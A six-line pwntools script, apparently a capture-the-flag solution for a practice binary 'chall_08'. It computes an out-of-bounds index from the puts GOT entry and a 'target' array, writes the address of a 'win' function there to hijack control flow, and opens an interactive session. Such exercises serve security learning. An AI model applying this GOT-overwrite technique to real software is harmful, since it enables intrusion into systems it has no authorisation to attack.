from pwn import *
binary = ELF("./chall_08")
p=process("./chall_08")
p.sendline(str((binary.got.puts-binary.sym.target)//8))
p.sendline(str(binary.sym.win))
p.interactive()
